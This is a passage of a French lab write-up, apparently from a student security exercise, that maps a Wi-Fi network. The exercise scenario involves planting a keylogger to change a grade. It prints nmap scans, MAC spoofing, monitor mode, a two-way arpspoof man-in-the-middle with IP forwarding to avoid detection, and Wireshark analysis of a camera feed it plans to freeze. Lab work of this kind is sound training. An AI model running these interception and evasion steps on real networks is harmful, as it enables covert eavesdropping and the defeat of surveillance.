# scan du réseau

## 1. Avant propos

Maintenant que nous sommes connecté sur le réseau Wifi, il faut pouvoir scanner le réseau et identifier les différente intéraction des systèmes présent. Pour cette partie, il faut une machine qui dispose d'une carte Wifi de la même manière que la partie de l'infiltration du réseau.

## 2. Rappel du sujet

***La mission est d'entrer dans la salle des 4AS (option à l'INSA CVL en STI) affaint de pouvoir brancher un Keylogger sur la machine de l'enseignant et pouvoir récupérer sont mot de passe pour pouvoir changer ça note obtenue et avoir la moyenne. Comme vous ête dans l'option 2SU, vous avez une porte qui mène directement dans la salle des 4AS, mais cette enseignant, suite à des problème entre des éleves à mis en place un système de carte surveillé par une caméra pour que seulement les profésseur puissent passer par la porte.***

***Pour que cette attaque soit indétectable, vous devez passer devant la caméra sans être vu, puis trouver un moyen de pirater le système de carte et ainsi ouvrir la porte.***

Nous avons réussi à nous connectez au réseau Wifi, il faut maintenant que nous puissions comprendre comment les différent système communique entre eux sans couper la connection au différent élements car cela est détecté, et visible avec un indicateur limineux.

## 3. Identification du réseau

### 3.1. Identification des différents élements en réseau

Pour commencer, nous devons identifier les différents système qui sont disponible sur le réseau. Pour cela nous allons utiliser `nmap` pour scanner toute les adresse IP et trouver les appareils en réseau.

```bash
$ ifconfig wlan0
wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500
	inet 192.168.2.4 netmask 255.255.255.248 broadcast 192.168.1.7
	inet6 fe80::75c8:4e9b:cae:dfd9 prefixlen 64 scopeid 0x20<link>
	ether 60:d8:19:27:01:8a txqueuelen 1000 (Ethernet)
	RX packets 15016 bytes 5143219 (4.9 MiB)
	RX errors 0 dropped 3526 overruns 0 frame 0
	TX packets 14165 bytes 4785271 (4.5 MiB)
	TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0

$
```

Nous pouvons constater que le mask de sous-réseau que nous avons est `255.255.255.248` se qui permet de résuire le nombre de scan à réaliser.

La plage d'adresse IP disponible dans ce réseau est comprit entre `[ 192.168.1.1 ; 192.168.1.6 ]`. Nous pouvons donc faire le scan avec `nmap` de ces adresse IP.

```bash
$ nmap -Pn 192.168.1.1-6
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-07 10:41 CET

Nmap scan report for 192.168.1.
Host is up (0.023s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT     STATE  SERVICE
20/tcp   closed ftp-data
21/tcp   closed ftp
23/tcp   closed telnet
80/tcp   open   http
1723/tcp open   pptp
2869/tcp open   icslap
MAC Address: 00:18:F8:40:CF:D8 (Cisco-Linksys)

Nmap scan report for raspberrypi. ************************ (192.168.1.2)
Host is up (0.022s latency)
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE
8081/tcp open  blackice-icecap
MAC Address: B8:27:EB:F2:C3:79 (Raspberry Pi Foundation)

Nmap scan report for raspberrypi. ************************ (192.168.1.5)
Host is up (0.022s latency)
Not shown: 1000 closed tcp ports (reset)
MAC Address: B8:27:EB:B9:42:13 (Raspberry Pi Foundation)

$
```

Nous avons donc trois appareil sur le réseau :
 - 192.168.1.1 : routeur Wifi
 - 192.168.1.2 : Raspberry PI
 - 192.168.1.5 : Raspberry PI

Une des deux Raspberry PI à un port ouvert `8081`. Nous devons donc identifier comment les systèmes communique entre eux.

### 3.1. Identification des intéractions entre les appareils

Maintenant que nous avons repéré les machines de disponible, nous pouvons identifier comment les machines intéragissent entre eux. Pour cela, nous allons utiliser `Wireshark`.

Lorsque nous utilisons directement `wireshark` pour écouter de manière passif ce qui se passe dans la réseau, nous n'avons que des trames `ARP`, et des trames du routeur. Ce qui nous intéresse c'est de pouvoir visualiser la communication entre les deux Raspberry PI. Pour cela, nous allons faire des modifications de la manière dont nous faisont l'écoute du réseau pour passer de passif à semi-actif.

Pour cela, nous devons passer notre carte réseau Wifi en mode moniteur. Nous pouvons aussi en profiter pour changer l'adresse MAC de notre carte réseau:

```bash
$ ifconfig wlan0 down
$ macchanger -r wlan0
Current MAC:   60:d8:19:27:01:8a (Hon Hai Precission Ind. Co., Ltd.)
Permanent MAC: 60:d8:19:27:01:8a (Hon Hai Precission Ind. Co., Ltd.)
New MAC:       de:28:71:0e:16:29 (unknown)
$ iwconfig wlan0 mode Monitor
$ ifconfig wlan0 up
$ ifconfig wlan0
wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500
	inet 192.168.2.6 netmask 255.255.255.248 broadcast 192.168.1.7
	inet6 fe80::75c8:4e9b:cae:dfd9 prefixlen 64 scopeid 0x20<link>
	ether de:28:71:0e:16:29 txqueuelen 1000 (Ethernet)
	RX packets 15016 bytes 5143219 (4.9 MiB)
	RX errors 0 dropped 3526 overruns 0 frame 0
	TX packets 14165 bytes 4785271 (4.5 MiB)
	TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
$
```

De cette manière, nous avons changez notre adresse `MAC` et mis la carte réseau en mode moniteur.

Avant de pouvoir réutiliser `Wireshark`, nous allons faire un `Man In The Middle` entre les deux Raspberry PI pour pouvoir intercepter tous les paquêtes échangé. Pour cela nous devons utiliser deux terminal.

```bash
# Premier terminal
$ arpspoof -i wlan0 -t 192.168.1.2 192.168.1.5
```

```bash
# Second terminal
$ arpspoof -i wlan0 -t 192.168.1.5 192.168.1.2
```

Cela permet d'envoyer des requêtes `ARP` au deux Raspberry PI,  pour que lors de communication entre elle, il faut passer par l'adresse `MAC` ça machine. Ce qui permet de récupérer touts les paquêtes des deux machines. Si nous exécutons seulement cela, la Raspberry PI qui a les voyant lumineux va détecter un problème dans le réseau.

![Wifi break](./imgs/01_network_break.png "Wifi break")

Cela est du au faite que notre machine récupére les paquêtes, mais ne les redirige pas. Pour régler ce problème il faut activer l'`IP forwarding` avec la commande suivante:

```bash
$ echo 1 > /proc/sys/net/ipv4/ip_forward
$
``` 

De cette manière, nous pouvons maintenant écouter les communications entre les deux machines sans avoir de coupure réseau entre les Raspberry PI.

Nous pouvons donc mainteant utiliser `Wireshark`

![wireshark](./imgs/02_capture_wireshark.png "wireshak")

Dans cette capture réseau, nous pouvons identifier que la Raspberry PI `192.168.1.5` fait des requêtes `TCP` sur le port `8081` à la Raspberry PI `192.168.1.2`. Nous pouvons donc suivre une requêtes qui est effectuer en faisant `click droit` sur le requête, puis `suivre`, `Flux TCP`. De cette manière nous obtenons la communication qui c'est effectuer.

![tcp](./imgs/03_tcp_capture.png "tcp")

Nous pouvons donc déterminer que `192.168.1.5` fait une requête `HTTP` vers `192.168.1.2` via un scipt python. La réponse de `192.168.1.2` contient `Content-type: image/jpeg` dans les métadonnées `HTTP`, nous pouvons donc déduire que c'est de cette manière que `192.168.1.5` récupére l'image de la caméra et fait l'identification de présence.

Il faut donc, pour pouvoir passer devant la caméra, modifier le trafic pour que l'image soit constant pour que la détection de présence ne puisse se faire avec le flux de la caméra.
